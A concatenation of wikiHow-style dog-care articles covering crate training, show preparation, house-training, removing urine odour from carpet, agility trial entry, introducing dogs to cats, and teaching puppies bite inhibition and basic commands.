Plastic crates feel cozier to most dogs, and can usually be used for air travel. However, they aren't the best choice in hot weather as dogs that get hot easily.
Soft-sided crates are lightweight and portable, however many dogs can chew their way out of them, and they can be difficult to clean.

, When you begin crate training, it is best to put the crate in a place where you and your family spend a lot of time during the day, like the kitchen or living room. Dogs are social animals, and like to feel that they are part of the pack. It is important not to put the crate in an isolated location, like the basement or garage. The crate should never feel like an isolating punishment for your dog.You should plan to move the crate to your bedroom at night when training a puppy, so you can take the puppy out when it needs to go to the bathroom.
Some dog owners simply set up two crates, one in the living area of their homes, and one in the bedroom.

, Place a blanket or towel on the bottom of the crate for the dog to sleep on. If you are using a mesh or wire crate, you can also drape a breathable blanket or towel over the top of the crate to create a cozier, more den-like atmosphere that may help your dog feel more secure.Some dogs and puppies might mistake the bedding for something to chew on, or as bathroom material. If this is the case, remove the bedding and clean the cage, and proceed without bedding. You can add it back in later as your dog matures., As you set up the crate, your dog may come over to investigate it. Say positive things about the crate to show your enthusiasm for it, and allow your dog to explore. However, you should not try to force your dog into the crate or close the door right away if he goes inside. Getting used to the crate takes time and patience, and the more excited you seem about the crate, the more excited your dog will become.

, Leave the door of the crate open and verbally encourage your dog to check it out. Your dog may go in to have a look see, or may not be so easily convinced. If your dog does enter the crate, be sure to give a lot of positive praise to let him know that you are pleased.


Do not shut the door on the dog if he does enter; wait until the dog is secure being in the crate before you close the door.

, You can close the treats inside the crate for a few minutes to build your dog's interest, or let the dog get to them right away. It is OK if the dog just pokes its head in to get the treats at first. Gradually move the treats further and further back into the crate until the dog has to go completely inside to get them.

, If your dog is not responding well to treats, try placing a favorite toy, or a brand new and especially tempting chew toy inside the crate.

, Once your dog will voluntarily enter the crate to retrieve a toy or treat, you can begin feeding him meals inside the crate. Put the food dish all the way back in the crate, and leave the door open while the dog eats his first meal or two in the crate.

, Once your dog seems content standing and eating in the crate, you can begin closing the door while he eats. Stay nearby where the dog can see you. At the first few feedings, open the door as soon as the dog is done eating. Then gradually leave the door shut for a few additional minutes after each feeding, until the dog is staying in the crate for 10 minutes at a time., Once your dog is used to eating in the crate with the door closed, you can leave him in for longer periods of time. Call your dog to the crate and give him a treat. Then choose a command, such as ""kennel up,"" point to the crate, and encourage him to enter. When he does, give him a treat and close a door. Stay near the crate for the first 5 to 10 minutes, then leave the room for a short time. Come back in the room, and let the dog out.


Repeat this process a few times a day for several days, gradually increasing the time your dog spends in the crate.

, When your dog can successfully stay in the crate for 30 minutes without whining or showing signs of distress, you can leave him in the crate while you leave the house for short outings. Make sure to exercise your dog before you leave, and put him in the crate. You may want to leave a toy or two with him. The simply put him in the crate as you have been doing and leave without any extra fuss., It is best to keep the crate in your bedroom initially, especially if you have a puppy that may need to pee during the night. As the dog gets used to sleeping in the crate overnight, you can move the crate to a different location if you prefer., Dogs need exercise and social activity to remain physically and emotionally healthy, and over-crating can lead to problems. Be aware of the following crate-time guidelines, and avoid leaving any dog in a crate for over 5 hours at a time, except at night.Age 9-10 weeks: 30-60 minutes.
Age 11-14 weeks: 1-3 hours.
Age 15-16 weeks, 3-4 hours.
Age 17+ weeks: 4+ hours (but never more than 6!).

, Do not let your dog out of the crate because of whining, unless you believe the animal needs to eliminate. Otherwise, you are rewarding the whining and encouraging the behavior in the future. Ignore your dog's whines for a few minutes. If he does not give up, take him outside quickly and matter-of-factly to eliminate, and then return the dog to the crate. Make sure you do not teach the dog that whining = escape from the crate., Many people don't have time to spend weeks crate-training a dog. If you follow the prescribed steps here, and remain positive and patient with the dog, most animals can be conditioned to love the crate in a single weekend., Purchase your crate and place it in the desired location. You can do this a few days ahead of time to get the dog used to the crate's presence. Leave the door of the crate open so your dog can explore.

, Sneak a few treats into the crate on Friday evening, and replace them as your dog discovers them. You can continue to sneak treats into your dog's crate after the initial training period is over to help maintain the positive association with the crate.

, Put your dog's evening meal in a bowl in the back of the crate. If your dog is reluctant to enter the crate completely, slide the bowl closer to the door, but as the dog begins to eat, try to push it further into the crate. If the dog seems comfortable, close the door until he is done eating, but only if things are going well.

, For the first training session, sit down next to the crate and call your dog. Show the dog a treat, and give a command to enter the crate (for instance ""go to bed"" or ""kennel up"",) then toss the treat into the crate. When the dog goes into the crate to get the treat, give him enthusiastic praise, and another treat while he is inside. Give your dog another command (e.g. ""come out"" or ""OK"") to leave the crate, and then repeat.


Repeat this process 10 times, then take a short break, and repeat another 10 times.

, Later Saturday morning, do another session. Give the first few treats as before. After a few times, instead of just throwing the treat into the crate, give the command and don't give the treat until your dog has entered the crate. Then give the command to leave the crate and give your dog another treat when he comes out.


Repeat this about 10 times, or until your dog appears to understand what is happening.
Take a short break, and then do another 10 repetitions.

, Begin by sending the dog into the crate and giving him a treat a few times as before. After a few repetitions, send the dog into the crate, give him a treat, and then gently close the crate door. Feed the dog a few treats through the door, and then open it. Give your dog the command to come out, and repeat.


Do the exercise 10 times, leaving the door open a little longer each time. Try to build up to 10, then 30 seconds.
If your dog seems anxious, only close the door part way at first.
Using lots of positive reinforcement throughout this process will minimize your dog's anxiety.

, Take a break, then repeat the above exercise. This time, once you close the crate door, sit down near the crate for increasingly long intervals of time, until the dog is comfortable being in the crate for a minute at the time.

, On Saturday evening, begin practicing leaving the dog alone in the crate for short periods. Begin with a few short stays in the crate as above. Next, send the dog into the crate, and then walk across the room or out of sight before coming back and rewarding your dog. Repeat this process 10 times. Then take a half hour break, and do it all again.

, Get a chew bone, or a KONG toy stuffed with food, and ask your dog to enter the crate. Then give him the toy, close the door, and then relax in the same room reading or watching TV for half an hour while the dog chews the toy. When the time is up, give your dog the command to come out and open the door and take away the toy. Repeat the process an hour or two later.


It is best not to celebrate the dog coming out of the crate too much. You want the dog to be excited going into the crate, not coming out.

, For the next session, you will want your dog to be well-exercised and ready to rest. Take him out for a long walk or play session, and get him tired out.

, Send your dog into the crate, and give him his special chew toy. Close the door and then leave the room for 10 minutes. Come back and let him out for awhile, then repeat the process with increasingly longer times in the crate. Make sure to give your dog play and bathroom breaks in between, and build up to an hour of crate time for your dog.

, On Sunday evening, it is time to try leaving the house. Send your dog into the crate and give him his chew toy. Then leave the house for 10 minutes. When your return, let the dog out of the crate and go about your evening. Do not celebrate or act excited about leaving or returning. You want to teach your dog that entering and exciting the crate is a totally normal event, and nothing to get excited about., After the weekend crate training, your dog should be ready to stay in the crate for several hours at a time, depending on the dog's age. Exercise your dog thoroughly in the morning, and then send him to the crate and give him a chew toy. Be sure not to make a big fuss about leaving, and only stay gone for a few hours before returning to give your dog a midday break. Remember to follow the age guidelines below, and don't leave your dog in the crate for too long:Age 9-10 weeks: 30-60 minutes.
Age 11-14 weeks: 1-3 hours.
Age 15-16 weeks, 3-4 hours.
Age 17+ weeks: 4+ hours (but never more than 6 hours!).

Only purebred dogs over six months old that are not spayed or neutered may take part in American Kennel Club (AKC) shows. That's because the purpose of these events is to judge whether your dog is good breeding stock.Your dog must also be registered as a purebred with the appropriate breed club and conform to all breed guidelines.If you got your dog from a breeder, they probably gave you the certification paperwork showing your dog is registered. If not, you'll need to contact the appropriate breed club. The AKC has an online directory you can use to contact the club.If your dog is spayed or neutered, there are other events you can take part in. The United Kennel Club (UKC) has an ""altered"" class that allows these dogs to compete.If your dog is not a purebred, it can compete in shows organized by mixed breed dog clubs.;
, The next step is to attend some dog shows to get a better sense of what it's all about.This will help you get a better sense of what judges are looking for, and what you can expect when you enter your dog.This is also a great way to get more information about the show process and preparing your dog. Visit the club table or tent to pick up information on entering your dog and training classes offered by the club., When your dog walks out into the ring, you'll need to have it on the right kind of leash or ""lead."" The sooner you get one of these, the sooner your dog can get comfortable with being on it. Go online or ask at your local pet store for one of these:


For small dogs, you can use a Resco “all in one” style collar with lead. The Resco is a loop with a slider to keep it snug on the dog’s neck. For a medium sized dog, you can use a martingale lead. These leads close up enough to keep your dog's head from slipping out, but don't tighten around a dog's neck like a choke-chain.They also help to train your dog to keep its head held up high while showing judges their gait, and while stacking.
The other commonly used lead is the chain and show lead. This is not as elegant as the martingale, but many handlers use them for larger, boxer breeds such as the Rottweiler. These also help your dog to keep its head held high, and to not run away in the ring.

, These classes help you train your dog for a show. Although this is not necessary, it is recommended.


Ringcraft classes can help you socialize your dog to other people and dogs. They can also help the dog learn to walk on a lead without being distracted by other dogs.These classes can also be a great source of information about shows and showing. They can be a good opportunity to meet other people involved in showing dogs., Gaiting is moving your dog in a way that allows the judge to see their movement and structure. The correct gait is usually a trot, with the dogs head up.


A trotting dog’s right front leg and left back leg move forward at the same time, then the left front with the right back.Trotting is the correct pace because it shows the dog’s true structure the best.
To start, use treats to lure your dog to follow you around without a lead. The dog should remain at your left side.
Once the dog is comfortable wearing the collar and walking beside you, formal lead training can begin. Attach a show lead to the dog's collar, pick up the dog and carry it a short distance away from your home. Put it down and walk back toward your house at a speed that encourages the dog to trot, holding the other end of the lead. The dog should be happy to go toward home and follow you. Repeat this process, carrying the dog farther away from home each time.If your dog fights the lead, back away and offer it treats to come toward you., In hand stacking, you manually place each leg in position while standing or kneeling close to the dog.


Dogs will have to stack several times during a show. Many people let dogs ""free stack"" most of the time, but hand stack right before the judge's examination. This ensures the best possible stance for the dog.The specific position your dog should be in will vary by breed. Consult the guidelines for your breed, available from the appropriate club.To train for hand stacking, keep a good-sized treat in your right hand. Keep it partially covered so the dog can only nibble on it as you adjust the positions of the dog's feet with your left hand.
Adjust the dog's front legs first, moving them at the elbow. Then, keeping your left hand on the dog at all times, move to the back legs and adjust them at the hock. Never stack by touching the dog's feet, as this may cause it to shift its whole body. Repeat this until your dog is comfortable with the process.Finally, teach the dog to maintain that position. Pull the food away for a second and tell the dog to stay. If it holds the position, say ""yes!"" and give the dog a nibble of the food. If it doesn't, restack the dog and try again., Free stacking is when your dog assumes the proper position on command, rather than with manual adjustment. This is most easily done with some training treats and clicker.


To begin with, click and reward your dog whenever it stands. If it keeps standing, reward it again. Keep doing this until the dog offers the stand position spontaneously.Next teach “back up.” Step toward the dog and click and treat any shift of movement backward, which should result in the dogs back legs aligning. Repeat this process with the command, clicking and reward increasingly correct backing up behavior.Then, teach the dog to align its front legs with the command ""step."" To teach this command, step back and click and treat as soon as the dog moves a front foot forward. Once the dog does this easily, say “step” just before you prompt it. Repeat this until the dog aligns it's front feet on command.Finally, teach the command ""stack."" Click and treat every time the dog is in the correct position. Repeat if the dog holds that position. Eventually, you'll be able to just use the ""stack"" command without ""back up"" and ""step."", You want your dog to also look alert and happy when stacked. Most breeds should have their attention on the handler and the judge, and have their ears perked and their eyes on you.


Training your dog to look at you is something you can begin the first time you feed the dog a meal. When you put the food bowl down, repeat the word “cookie"" over and over. This repetition will teach the puppy to associate a food with that word.Later, use this command to focus your dog's attention on you while offering it treats from your hand when it is in a stacked position. This causes the dog stretch its neck upward to look at you. This pose shows the dogs outline and balance to the judge., In a dog show, judges will physically examine a dog, touching its body and mouth. A successful show dog will need to tolerate this without complaint.


A good first step in getting your dog accustomed to this is to to touch the dog all over its body daily, including inside its mouth. If you start this at a young age, your dog will quickly grow accustomed to it.Next, begin giving your dog regular inspections that approximate those of a judge. Closely examine the dog's teeth. For males, touch the testicles.Do this on both a table and the floor, if your dog is smaller in size. While small dogs are usually inspected on a table, some judges will begin inspection while the dog is still on the ground.Finally, when the dog is comfortable with your inspections, bring in a second person and ask ask them to do the same. This way, your dog will get comfortable with inspection by strangers., Before you try taking your dog to a major club show, try showing your dog with a small, local club. This can be fun, and a good way to determine if your dog is ready for the ""big leagues."""

Get the right leash.,
Be patient when leash training your new dog.,
Take your new dog out when it needs to go.,
Take your dog out on a regular schedule.,
Recognize when your dog needs to go and when it doesn’t.,
Give your new dog more freedom.,
Gradually increase the amount of time your new dog spends off the leash.",How to Acclimate a New Dog Using Indoor Leash Training1," The best leash for indoor leash house-training is a six-foot leash. This will give your new dog space to roam about, but won’t allow your dog to get so far away that it can get into mischief. A six-foot leash is also ideal because a longer leash indoors could easily get tangled on furniture, family members, or other housemates., If your dog thrashes about while tied to the leash indoors, wait patiently for your dog to relax. Offer reassuring words like “It’s okay” and “Easy now.” Pet your dog as you speak calmly to it. When your dog has relaxed, say “Good dog” in an enthusiastic manner. You might also choose to give your new dog a chew toy or a dog bone to distract it.If your dog is especially fussy, enroll your new dog in a doggy training school to help it learn some discipline.

, With your dog on a short leash, you’ll know when your new dog needs to relieve itself because it will start to fuss and whine. It might also pull away from you towards the door that leads to the yard or area where it relieves itself. When this happens, take your dog outside so it can do its business.Other signs that your dog wants to go out include walking away from interesting games or activities, pacing with nervous energy, spinning or walking around in tight circles, and barking., Some new dogs don’t display many indications that they need to void. These less active dogs will, in most cases, wait patiently until you choose to take them out. These dogs benefit from being on a short leash indoors because the proximity to their human makes them reluctant to void themselves.Your new dog should go out when it wakes, within the hour after it eats and drinks, and again just before bedtime. These times should be regularized so that the dog voids at regular times as well.
Even if your dog is on a regular schedule, pay attention to its behavior for signs that it needs to void.

, Once you move outside with your new dog, indoor leash training becomes outdoor leash training. Don’t stay outside for too long, or your dog will end up leading you over every inch of the yard exploring the sights and smells. If your dog needs to void, it will do so almost immediately – within a minute or two – after being taken outside.Once your new dog voids, take it back inside to resume indoor leash training.

, Once your dog is consistently demonstrating that it needs to go out or voiding in accordance with a regular schedule, you can begin to ease it off the leash. After about two weeks without accidents in the house, allow your new dog some unleashed time. The best time to allow it to wander about unleashed is when its least likely to have an accident, which is right after it has voided.Allow new dogs younger than six months of age about 5 minutes of time off the leash when they’re ready.
Allow new dogs older than six months of age about 10 minutes of time off the leash when they’re ready.

, For instance, you could increase the amount of time your new dog spends off the leash by five minutes each day until it can spend the entire day off the leash. If at any point your dog begins voiding in the house again, put it back on the leash, allowing only minimal off-leash time. Allow your new dog to earn back it’s leash-free time."

Develop a routine for your puppy.,
Get your puppy’s attention if she tries to eliminate in the house.,
Limit your puppy’s space within your home while your puppy is housetraining.,
Pick a designated bathroom spot outside.,
Praise your puppy for a job well done.,
Clean messes up right away.,
Consider crate training your puppy.",How to Train Puppies1," To begin housetraining your puppy, create a routine to help your puppy learn. Puppies need a consistent routine in order to learn when and where they are supposed to relieve themselves. It's important to start teaching your puppy to go outside when she feels the urge as soon as you bring her home. Plan to take her outside on a set schedule every day: first thing in the morning, after every meal, after playtime, and right before bed.Puppies should be taken out every hour, as well as shortly after meals, naps, and playtime. You should always take your puppy out first thing in the morning, before you and the puppy go to bed at night, and before you leave the puppy alone for any extended period of time.
Feed your puppy at the same time every day so you can predict when she'll need to go outside.
Very young puppies have to go to the bathroom as often as once an hour.That means you or a family member will need to be available to take your puppy outside that often.
If you aren't available to housetrain your puppy during the day, it's important to hire someone else to do it professionally. If you don't start early, it may take your dog a long time to learn not to go to the bathroom in the house.;
, If you notice your puppy going potty inside the house, don't overreact by yelling at her or scaring her. Interrupt her while she's doing her business by clapping your hands together. Then pick her up or get her to follow you right away and take her to her bathroom spot. When she finishes going to the bathroom there, reward her with some praise.If you find a mess behind the sofa or somewhere else in your house, it's too late to discipline the puppy. Don't rub her nose in it; she'll just get confused and scared, and she won't understand what you're trying to teach her.

, For the first few months you will need to keep a careful eye on your puppy so that you can take her outside as soon as she has to go to the bathroom. If you give her too much freedom around the house at first, she'll learn to go to the bathroom wherever she wants, and you won't always be able to catch it in time.Use baby gates to limit your puppy’s area within your home. For example, you could put a gate up at the bottom of the stairs to prevent your puppy from roaming around the upper level of your home or put gates up to limit your puppy’s movement between a couple of rooms in your home. Allow your puppy more freedom as she becomes better at controlling her bladder and bowels.Try putting your puppy on a leash when she is exploring a new room. It will be much more difficult for your puppy to get into trouble when you are attached to the other end of the leash.

, Having a place that the puppy associates with going to the bathroom will help her learn not to go in the house. She'll start wanting to go to that spot to relieve herself, and over time she'll learn to wait until you take her there instead of going to the bathroom inside.Use language to strengthen the puppy's association with the spot. Say ""go potty"" or just ""potty"" when you set her down. Don't use the word anywhere but in that spot.
Many people choose a far corner of the yard, sometimes a place that is fenced off, as the spot where their dog goes to the bathroom. If you don't have a yard, choose a spot close to your home or apartment. It doesn't matter where the location is as long as you take your puppy to the same spot every time.
Bringing her to the same spot will associate the smells of the spot with going potty. Smells can often prompt a puppy to eliminate.
Keep in mind that some puppies will go potty as soon as your take them outside, while others may need to move around a play a bit before they can eliminate.

, When the puppy successfully goes to the bathroom in her designated spot, praise her, pet her and give her a treat. Doing so will help your puppy to understand that this is good behavior and that she should keep doing it.The promise of a reward will encourage her to perform the same good behavior again.


Give your puppy her reward immediately after she goes to the bathroom and while she's still in her bathroom spot. If you wait, she'll associate the praise with something else.
Wait until your puppy finishes going potty. If you praise your puppy before she has gone to the bathroom, she may get confused.

, Your puppy will have accidents from time to time and it is important to clean them up right away. Cleaning up your puppy’s messes right away will to help prevent further messes in your house.Use an enzymatic cleaner rather than an ammonia-based cleaner to clean up your puppy’s messes right after they happen. Ammonia based cleaners smell too much like urine, so your puppy may confuse the smell with her own urine. If the area smells like urine, your puppy may want to go to the bathroom there again., A crate helps with potty training because dogs do not like to soil their dens. A crate should be a safe place where your puppy can retreat to during the day if she becomes overwhelmed or that she can go to feel safe when you are away.Make sure the crate is big enough for her to stand up in and lie down with her legs stretched out. If it is too much bigger than this, then she may choose a corner of the crate as a bathroom spot.
Make sure not to use the crate as a punishment. Take her out regularly for a game or to offer a toilet break.

Remove the odor with baking soda.,
Try hydrogen peroxide, vinegar, and baking soda.,
Replace the carpeting if necessary.",How to Get Rid of Dog Urine in Carpet3," If an odor lingers after you have cleaned the stain, baking soda is great at neutralizing odor. Sprinkle baking soda over the area that smells. Work the baking soda into the carpeting using a scrub brush. Then, vacuum the baking soda out of the carpet., A mixture of hydrogen peroxide, vinegar, and baking soda can be used to remove pet odors. In a spray bottle, add five ounces of hydrogen peroxide with a teaspoon of vinegar, a teaspoon of baking soda, and half a teaspoon of orange-scented dishwasher soap. Shake the bottle until everything mixes together completely.Spray your mixture over the area that smells. Get the carpeting very wet for the best effect. When the mixture dries, it becomes a powder.
Once the mixture has become a powder, vacuum it up.

, If you cannot get a smell out, it may have sunken deep into your carpeting. Dogs are attracted to the smell of urine and may continue to go in the same place. If a smell lingers despite your efforts, consider replacing the portion of carpeting that is causing the issue. This is sometimes the only way to deter dogs from urinating in inappropriate places."

While these are the four primary groups, there are many other groups that sanction agility trials. Search online for additional agility trials that might be offered by other groups in your area.The AKC agility trial requires dogs and handlers to negotiate an obstacle course.The USDAA agility trial has two types of agility programs, the Championship Program and the Performance Program. Compared to the Championship Program, dogs in the Performance Program will face lower jump heights and are allowed longer time on the course. In both programs, dogs must achieve a jump height determined by their own size. Larger dogs must jump higher than smaller dogs.The NADAC agility trials are often co-hosted by judging clinics that help fund NADAC Championships. Rules and regulations vary. At the NADAC Championship level, there are three classes available for dogs to compete in. Access to a given competition class depends on the dog’s participation and performance in NADAC competitions throughout the year. The more points a dog earns at NADAC events over the course of the year, the higher the competitive level the dog can compete in during the Championships.The CPE agility trials are cohosted by various canine organizations. Consult event organizers for more detailed information.;
, Each agility trial has its own rules and regulations. These are typically posted online, though you might only receive specific guidelines for the agility trial you and your dog enter into when you officially register.AKC rules and regulations are available at http://images.akc.org/pdf/rulebooks/REAGIL.pdf.
NADAC rules and regulations are available online at http://www.nadac.com/Rules_for_NADAC_trials.htm.
USDAA rules and regulations are posted online at http://usdaatitlemania.com/wp-content/uploads/2016/03/USDAA-TitleMania-Regs-Final-Revisions.pdf.
CPE rules are available at http://www.k9cpe.com/forms/2016rb.pdf.

, There is no national standard for how agility trials need to be carried out. Instead, each group comes up with its own standard. You should familiarize yourself with the specific course set-up for each group.AKC uses a very tight course, so there is less distance between obstacles. AKC also gives out more faults.
NADAC uses looser courses and gives out fewer faults. However, the courses have shorter time limits.
USDAA allows you to walk your dog on a lead during certain parts of the course.
CPE has lower jump heights.
For a complete list of course specific, visit each group’s website.

, Each group has similar but slightly different registration requirements. Your dog must meet the specific requirements for the group in order to be accepted into an agility trial.Most organizations require a dog’s full name, sex, breed, birthdate, and height. They also require your name, address, email, and phone number.
AKC only allows purebred dogs to compete. NADAC, USDAA, and CPE allow both purebred and mixed breed dogs to compete.
One final thing to do when deciding if you and your dog can enter an agility trial is to evaluate the particular preconditions of a given trial. Certain NADAC trials, for instance, require that your dog has competed in other NADAC trials over the course of the year.Check each groups website for a complete list of registration requirements.

, After evaluating registration requirements, differences between various organizations, and the courses offered by each group, you’ll probably be ready to make a decision about which trial you and your dog want to compete in. But there are three main factors relating to your dog that you should also consider when determining whether you and your dog are ready to enter an agility trial.Age is one – your dog cannot be too old or too young. Agility trials generally require that a dog is at least one year old. Some trials – the USDAA trials, for instance – hold separate trials for “veteran” dogs over the age of seven.
Breed – which determines the size of the dog – is also important. Large dogs have a harder time negotiating certain narrowly-placed obstacles.
Finally, analyze your dog’s ability to learn and obey commands. Some breeds are naturally harder to train than others. German Shorthaired Pointers, Basenjis, Afghan Hounds, and Tibetan Spaniels, for instance, do not readily obey commands.
If your dog still cannot sit, lie down, and roll over without significant coaxing, it is probably not a good candidate to enlist in an agility trial.

, You can find entry forms – also called “premiums – on each group’s website. Alternatively, you can visit http://www.dogeventsonline.com for a repository of entry forms for local and national events., Title level refers to whether your dog is a beginner or an experienced agility trialer. Most groups require you to start at the lowest level and earn qualifications for high levels.AKC has six title levels: Novice A, Novice B, Open, Excellent A, Excellent B, and Master.
NADAC has three levels: Novice, Open, and Elite.
USDAA has three categories, each with their own levels. The categories are Championship, Performance, and Junior.
CPE has six levels: Level 1, Level 2, Level 3, Level 4, Level 5, Level C.Check each group’s website for a description of the title levels.

, Each groups breaks competitors into divisions. If your dog has a handicap or the handler is elderly, you will compete against other dogs and handlers in the same division.AKC has two divisions: Standard and Junior.
NADAC has three divisions: Standard, Veterans, and Junior Handlers. Within the Veterans division, you could choose to register as a Veteran (with jumping), Veterans (non-jumping), or Veteran or Disabled Handler. Veteran handlers are defined as age 60 and over.USDAA has two divisions: Standard and Junior Handler Program.
CPE has four divisions: Standard, Veterans, Jr Handler, and Handicapped/Differently Abled Handler.
Each group’s website contains a complete description of the divisions.

, The category refers to how high your dog will have to jump. Generally, your dog will be measured and assigned a specific jump height. However, each group has an event that allows you to enter your dog in an event will jumps lower than your dog’s jump height.AKC has two categories: Regular and Preferred. In the Regular category, dogs must jump their measured jump height. In the Preferred category, you may jump your dog one height lower than their measured jump height.NADAC has two categories: Proficient and Skilled. In the Proficient category, dogs must jump their measured jump height. In the Skilled category, you may jump your dog one jump height lower than their measured jump height.USDAA has two categories: Championship Program and Performance Program. In the Championship Program, dogs must jump at their measured jump height. In the Performance Program, you may jump your dog one height lower than their measured jump height. CPE has four categories: Regular, Veterans, Enthusiast, and Specialist. In the Regular category, dogs must jump at their measured jump height. In the Veterans category, you may jump your dog 4” lower than their measured jump height. In the Enthusiast category, you may jump your dog 4” lower than their measured jump height. In the Specials’ category, you may jump your dog 8” lower than their measured jump height.

, Classes are the different games, courses, and obstacles that are available for your dog to demonstrate their agility. Each class tests a different set of skills.AKC offers three classes: Standard, Jumpers With Weaves, and Fifteen And Send Time (FAST).NADAC offers six classes: Regular, Jumpers, Tunnelers, Weavers, Touch-N-Go, Chance, and Hoopers.USDAA offers four classes: Standard, Gamblers, Jumpers, and Snooker.CPE offers seven classes: Standard, Colors, Wildcard, Jackpot, Snooker, FullHouse, and Jumpers.Check each group’s website for a complete description of the various classes.

, Registration fees for agility trials vary. Some organizations charge $10 or $12 per run, with discounts if you enter your dog in more runs.Some registration fees depend on the event the dog is entered in. Consult the registration fee schedule for your dog’s specific event for more information., The premium will list many important details, including the location of the trial site, whether refunds are available, and whether you need to check-in the night before the event. Always read the premium carefully. Check the deadline on your entry form and get it in as soon as possible.Many events fill up fast, so you’re more likely to get a spot if you submit the entry form early.

Obtain the necessary supplies.,
Keep the peace between your new dog and other pets.,
Provide a crate.,
Play games with your new dog.,
Keep your dog healthy.",How to Acclimate a New Dog Using Indoor Leash Training2," Your new dog will need several things to acclimate comfortably. You’ll need dog food, water bowls, and a dog food bowl. You’ll also need some toys. And besides a good leash and collar, you’ll need ID tags so your dog can be easily identified if it gets lost.Get a ceramic water and dog food bowl rather than a plastic or tin one. Ceramic is heavier and therefore less prone to spilling over.
Different dogs like different toys. Provide a variety of amusing toys for your new dog. For instance, your new dog might enjoy KONG toys, dogs bones, knotted rope toys, and/or bouncy tennis balls.

, If you have other dogs or cats, they may feel jealous or threatened by the presence of a new dog. Pay more attention to them than to the new dog so they don’t feel the are being replaced as the “alpha” pet., A crate is place your new dog can go to retreat from the worries of the world. Dogs love spending time sleeping or chewing a dog bone in their crate. The right-sized crate should be large enough for your new dog to stand up and turn around.Place your dog’s food and water bowls near the crate so it associates the crate with good feelings and safety., Like humans, dogs need exercise to stay healthy. Dogs love running, jump, and playing. Set aside time to take your dog walking at the park or just around the block. Go to the beach and play Frisbee with your dog. Toss a ball or chew toy to your dog in the backyard.Always keep your dog on a leash during walks.

, Ensure that all your pets are healthy and up-to-date on their vaccinations when bringing a new dog into the equation. Get your new dog to the vet before bringing it home so that it can get checked over. If your new dog has not received the most up-to-date vaccinations and shots, take it to the vet so it can receive them."

Help your dog relax.,
Place your cat somewhere safe.,
Put your dog on a short leash.,
Introduce the dog and cat.,
Gradually close the distance between your dog and cat.,
Remove the leash.",How to Acclimate a New Dog Using Indoor Leash Training3," Feed your dog a pleasing meal. Take it for a walk to help it digest its food and work off excess energy. This will help your dog feel more at ease when it first meets its feline counterpart.You could also help your new dog relax by strapping a pheromone collar on it. Pheromone collars release pheromones – chemical compounds that dogs produce naturally – to help your dog calm down.Pheromone collars are available at most pet stores and online.

, Your best bet is to place your cat in an enclosed room and close the door. Let your new dog wander the house getting the cat’s scent for about 40 minutes. Then, take your dog out for a walk and have a housemate or family member let the cat out of the room. This will let your cat “meet” your new dog by scent.Ensure your cat has access to its litter box while in the safe room.

, You could tie the short leash to your belt or just walk around with it in your hand. In either case, keep the dog on a short lease and close to you for several days. This will ensure that your dog does not go near your cat unless you allow it, and that you can separate your cat and dog quickly if necessary., Allow them to see each other from a distance at first. Talk to your dog in a soothing manner. You might say things like, “Good dog” or “That’s your feline friend.” These calming words will help your dog relax.If your cat is afraid of your dog during this early period, place it in its carrier. You can detect fear in cats by listening for hissing and looking for raised hair along the spine of the cat.
If your dog runs toward the cat, it won’t get far because it is on a short leash. Stop your dog’s lunging by commanding it to sit or lie down.
These encounters should last several minutes. Repeat several times each day.

, Each day, allow your dog and cat to come a bit closer to each other by extending the length of the leash slightly. If at any point you detect hostility on the part of either the dog or cat, increase the distance between them again.Don’t confuse real hostility with playful “sibling rivalry” and socialization. Your cat and dog might swat at each other, but don’t separate them immediately unless you hear hissing or growling. These are indications that continued contact could lead to either or both being harmed.
Use both animals’ names when attempting to reassure or restrain them.

, Once your dog and cat have interacted in a positive, healthy way, with your dog’s leash extended to its maximum length, you should begin to remove the leash from the equation altogether. Let your dog roam the house without its leash for 20 minutes or so, then replace the leash. Repeat several times daily.If the initial no-leash session was free of conflicts between the dog and cat, extend the no-leash time to 40 minutes per session. If that session is successful, extend the no-leash time to one hour.
Continue to add time in 20-minute increments in this way until your dog is completely unbound from its leash. Supervise your dog and cat closely from this point on.
At this stage, you do not need to put the dog back on a leash if it gets into a conflict with the cat, but you should separate them. Close one of them in a separate room for about an hour. This “time out” period will give each animal time to cool down.

Let your puppy play with other puppies.,
Discourage your puppy from biting you.,
Give your puppy chew toys.,
Employ a time-out area.,
Teach your puppy to play well with children.",How to Train Puppies2," Puppies learn how to socialize by playing with other puppies. Very young puppies don't know that they can hurt others with their teeth. They learn by playing; when one puppy bites another puppy too hard, the puppy yelps and stops playing. In this way, puppies learn to control how hard they bite., Play with your puppy the way another puppy would; by tickling her and wrestling with her until she starts to nip at you. When she bites your hand, let out a high-pitched yelp, just the way another puppy would. Let your hand go limp and stop playing. Your puppy will learn that when she bites, she doesn't get attention anymore.


Your puppy may try to making up for the bite by nuzzling and licking your hand. Praise her in a sweet voice and reward her with a treat, then keep playing with her. She'll learn that playing nicely gets rewarded.Never spank a puppy to cause her pain in return. Using physical punishment against a puppy will only make her afraid of you.

, Puppies love to use their teeth, and they have to be taught that human skin is not for chewing. Provide plenty of puppy-safe chew toys for your puppy to gnaw on during play time.


When your puppy starts nipping at your skin, put a chew toy in her mouth. This will teach her that she should be chewing on the toy instead of your hand.
Do the same thing if your puppy nips at your heels and ankles when you walk around. Stop walking and give her a chew toy. If you don't have a toy handy, just stop. When she starts playing nicely, praise her.If she grabs something of yours, distract her and and swap the item for one of her own toys in its place.

, If your puppy is having trouble learning not to bite, you may need to create a time-out area, a place where you take her to teach her that if she can't play nice, she doesn't get to play. Set aside a corner of her play room and take her there right away when she bites.


Don't use the puppy's crate as a time-out area. She should never associate being crated with punishment.
After your puppy has been in time out for a few minutes, bring her back to play with the family. Reward her when she plays nicely. If she bites again, give a high-pitched yelp and take her right back to time out. Eventually she will learn not to bite.

, Children move quickly, make high-pitched noises and are often on face level with puppies. Puppies and children can have a lot of fun together, but they have to be taught to play properly. If your puppy gets rough with a child, put her in time out immediately. Make sure your kids know how to place nicely, too.


Always supervise your children around your puppy. Make sure that your children know that puppies are fragile and teach them what to do if the puppy nips or gets too rough."
"
Start by teaching your puppy her/his name.,
Teach your puppy to sit.,
Teach your puppy to stay.,
Teach your puppy to come.",How to Train Puppies3," In order to train your puppy effectively, make sure she knows her name. Say her name clearly. When she looks at you, give her a treat. Continue doing so until she learns that when you say her name, she should look at you. Now you can use her name before issuing other commands.

, This is one of the easiest behaviors to teach a puppy, and almost any puppy can learn how to do it. The trick is to get your puppy to associate the act of placing her bottom on the floor with the sound of your voice saying ""sit."" Tell her to ""sit"" in a clear, firm but friendly voice. When she does, give her a treat.Practice often. Sitting can be practiced inside, outside, and anywhere you take your puppy. Carry treats with you so you can turn any moment into a training session.
